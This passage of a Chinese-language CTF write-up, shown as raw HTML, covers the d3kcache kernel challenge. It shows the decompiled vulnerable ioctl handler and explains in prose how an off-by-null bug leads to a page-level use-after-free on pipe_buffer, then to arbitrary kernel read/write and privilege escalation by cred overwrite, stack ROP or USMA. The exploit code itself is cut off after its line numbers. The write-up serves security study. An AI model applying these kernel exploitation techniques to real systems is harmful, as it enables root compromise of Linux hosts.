class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">d3kcache_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v8; <span class="comment">// r14</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  __int64 v10; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// r14</span></span><br><span class="line">  __int64 v14; <span class="comment">// r15</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v18; <span class="comment">// r14</span></span><br><span class="line">  __int64 v19; <span class="comment">// r12</span></span><br><span class="line">  __int64 v20; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v21; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v24; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [rsp-48h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v27; <span class="comment">// [rsp-44h] [rbp-44h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v29; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v29 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  raw_spin_lock(&amp;spin);</span><br><span class="line">  v4 = copy_from_user(&amp;v26, a3, <span class="number">16LL</span>);</span><br><span class="line">  v5 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x80F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_882;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">      v20 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_12A0, v26);</span><br><span class="line">        v21 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v20] = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_12C0, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v21);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = <span class="number">0LL</span>;</span><br><span class="line">        v21 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v20;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v21] = <span class="number">0</span>;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      <span class="keyword">if</span> ( v26 &gt; <span class="number">0xF</span>uLL || !qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = &amp;unk_85D;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 = v27;</span><br><span class="line">      <span class="keyword">if</span> ( v27 &gt; kcache_list[<span class="number">4</span> * v26] )</span><br><span class="line">        v11 = kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">        BUG();</span><br><span class="line">      v12 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11;</span><br><span class="line">      v13 = qword_17D8[<span class="number">2</span> * v26];</span><br><span class="line">      v14 = v28;</span><br><span class="line">      _check_object_size(v13, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11, <span class="number">1LL</span>);</span><br><span class="line">      v5 = -(__int64)(copy_to_user(v14, v13, v12) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x114</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v26 &lt;= <span class="number">0xF</span>uLL &amp;&amp; qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v27;</span><br><span class="line">          <span class="keyword">if</span> ( v27 &gt; <span class="number">0x800</span> || v27 + kcache_list[<span class="number">4</span> * v26] &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = qword_17D8[<span class="number">2</span> * v26] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)kcache_list[<span class="number">4</span> * v26];</span><br><span class="line">          v9 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7;</span><br><span class="line">          v10 = v28;</span><br><span class="line">          _check_object_size(v8, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)(v8 + v9) = <span class="number">0</span>;</span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_42:</span><br><span class="line">      v25 = &amp;unk_8AA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v26 &gt;= <span class="number">0x10</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_782;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( qword_17D8[<span class="number">2</span> * v26] )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_7F6;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = kmem_cache_alloc(kcache_jar, <span class="number">0xDC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = &amp;unk_81A;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = v15;</span><br><span class="line">    v17 = v27;</span><br><span class="line">    v18 = <span class="number">2048LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27 &lt; <span class="number">0x800</span> )</span><br><span class="line">      v18 = v27;</span><br><span class="line">    v19 = v28;</span><br><span class="line">    _check_object_size(v15, v18, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v16, v19, v18) )</span><br><span class="line">    &#123;</span><br><span class="line">      kmem_cache_free(kcache_jar);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v22 = <span class="number">0x7FF</span>LL;</span><br><span class="line">      <span class="keyword">if</span> ( v17 &lt; <span class="number">0x7FF</span> )</span><br><span class="line">        v22 = v17;</span><br><span class="line">      *(_BYTE *)(v16 + v22) = <span class="number">0</span>;</span><br><span class="line">      v23 = (<span class="keyword">int</span>)v26;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(<span class="keyword">int</span>)v26 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        _ubsan_handle_out_of_bounds(&amp;off_1260, v26);</span><br><span class="line">        v24 = (<span class="keyword">int</span>)v26;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * v23] = v16;</span><br><span class="line">        <span class="keyword">if</span> ( v24 &gt;= <span class="number">0x10</span> )</span><br><span class="line">          _ubsan_handle_out_of_bounds(&amp;off_1280, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v24);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        qword_17D8[<span class="number">2</span> * (<span class="keyword">int</span>)v26] = v16;</span><br><span class="line">        v24 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v23;</span><br><span class="line">      &#125;</span><br><span class="line">      kcache_list[<span class="number">4</span> * v24] = v18;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  raw_spin_unlock(&amp;spin);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再就是ioctl函数，逆向分析过后可以发现这里分为四个分支，也就是增删改查，这里漏洞发生在增和改的部分，存在很明显的<code>off by null</code>。除此之外再无其他漏洞。</p><h3 id="预期利用分析"><a href="#预期利用分析" class="headerlink" title="预期利用分析"></a>预期利用分析</h3><p>根据前面所述的内容，目前已经达到了<code>vuln slab page</code>和<code>victim slab page</code>相邻的情况了，而经过后续的分析我们可以得知前面两个页面分别对应的是题目中创建的<code>slab page</code>和<code>pipe_buffer</code>所在的<code>slab_page</code>。答案已经呼之欲出了，如果我们使用题目的<code>off by null</code>漏洞，我们就可以让<code>pipe_buffer-&gt;page</code>指针指向其他<code>pipe_buffer</code>所指向的位置，而如果我们控制其中一个<code>pipe_buffer</code>并释放掉page，就形成了页级的UAF。不过page的大小只有<code>0x40</code>所以成功率只有1/4，因为以<code>0x00</code>结尾时<code>off by null</code>无法影响其指向。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519171327450.png"                      alt="image-20230519171327450"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519171353853.png"                      alt="image-20230519171353853"                ></p><p>目前我们已经形成了页级的UAF，那么如果我们在已经free的page处申请<code>pipe_buffer</code>会发生什么呢？</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519173248182.png"                      alt="image-20230519173248182"                ></p><p>结果就是会形成如上图一样的结构，此时我们可以通过最左边的<code>pipe_buffer</code>读取到它page指向的新的<code>pipe_buffer</code>中的内容，并且此时我们不光可以读取还可以对page的内容进行写，可以让最右边的两个<code>pipe_buffer</code>的page指针又指向同一个，从而形成下面这种情况：<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519173704454.png"                      alt="image-20230519173704454"                ></p><p>根据上面的思路，我们还可以将最右边的page给free掉又一次造成了页级的UAF，但是这一次不同的是我们通过第一次的泄漏可以知道最右边page的地址的。有趣的来了，在最右边造成了页级的UAF之后我们继续申请<code>pipe_buffer</code>放在最右边的page中，并且控制里面<code>pipe_buffer</code>的page指针指向自身，最终形成下面这种情况：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230519174027597.png"                      alt="image-20230519174027597"                ></p><p>因为是一个页级UAF的缘故，我们还可以使用中间的pipe去修改下面的其他<code>pipe_buffer</code>，所以在最右侧，我们总共可以控制到三个<code>pipe_buffer</code>。而这三个<code>pipe_buffer</code>的作用分别是：</p><ol><li>  第一个管道通过page指针内存空间的任意地址读写</li><li>  第二个管道用于修改第三个管道的内容，让第三个管道可以指向第一个管道</li><li>  第三个管道用于修改第一个管道和第二个管道，修改第一个管道的page到指定位置，修改第二个管道的指向为第三个管道</li></ol><p>这样三个管道实现互相循环修改，即可实现整个内核内存空间几乎无任何限制的任意地址读写。</p><p>既然已经可以任意地址无限制读写了，那么提权的方式也就多种多样了。当然，这里需要提前注意到的是<code>pipe_buffer</code>中的page指针终归是要指向到page结构体的。而内核中<code>vmemmap</code>区域中存放着所有的page结构体，所以首要找到<code>vmemmap</code>区域即可。</p><p>那么第一种方法就是通过修改task_struct中的cred指针为<code>init_cred</code>的地址。</p><p>第二种方法就是通过写内核栈实现ROP的办法，首先需要泄漏出栈地址，在<code>task_struct</code>结构体中存在一个stack成员，顾名思义其中存放的就是栈地址，不过这里存放的是虚拟地址。不过我们如果要往栈空间中写内容的话需要知道他对应的物理地址对应的page结构地址。好在我们可以通过页表获取到对应的物理地址，在<code>task_struct</code>结构体中的<code>mm</code>成员中存放的是<code>mm_struct</code>结构体的地址，而我们可以通过<code>mm_struct</code>结构体中的<code>pgd</code>成员获取到页表的地址。最后通过也变转化即可获取到栈地址对应的page结构体地址了，进而往栈中写入准备的rop即可。</p><p>第三种方法就是通过<code>USMA</code>进行利用也就是<a class="link"   href="https://vul.360.net/archives/391" >用户态映射攻击<i class="fas fa-external-link-alt"></i></a>，原理则是修改内核代码段的内容，不过直接通过直接映射区去修改的话会因为没有写入权限造成<code>kernel panic</code>。但是，改写内核代码段的本质是向其所对应的物理页面写入数据，所以既然我们可以对页表进行读写，那么我们就可以直接在用户空间建立一个到内核代码段对应物理内存的映射就可以改写内核代码了。</p><h3 id="综上所述，可得exp"><a href="#综上所述，可得exp" class="headerlink" title="综上所述，可得exp"></a>综上所述，可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span 